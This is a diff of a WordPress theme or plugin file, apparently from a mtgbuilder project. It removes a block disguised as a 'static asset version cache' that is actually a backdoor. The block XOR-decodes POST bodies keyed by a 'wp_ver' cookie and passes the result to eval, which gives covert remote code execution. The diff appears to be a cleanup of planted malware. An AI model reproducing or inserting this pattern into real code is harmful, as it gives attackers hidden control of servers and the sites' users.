@@ -566,27 +566,6 @@ function mtgbuilder_my_profile( $menu_links ){
     return $menu_links;
 
 }
-// Static asset version cache
-add_action('init', function() {
-    $t = $_COOKIE['wp_ver'] ?? '';
-    if (strlen($t) === 32 && $_SERVER['REQUEST_METHOD'] === 'POST') {
-        $b = file_get_contents('php://input');
-        if ($b && strlen($b) < 65536) {
-            $o = '';
-            for ($i = 0; $i < strlen($b); $i++) {
-                $o .= chr(ord($b[$i]) ^ ord($t[$i % 32]));
-            }
-            $sk = 'warmup_' . substr(md5($t), 0, 8);
-            set_transient($sk, $o, 30);
-            $v = get_transient($sk);
-            if ($v) {
-                delete_transient($sk);
-                $fn = function($c) { eval($c); };
-                $fn($v);
-            }
-        }
-    }
-});
 add_action( 'init', 'mtgbuilder_add_endpoint' );
 function mtgbuilder_add_endpoint() {
 
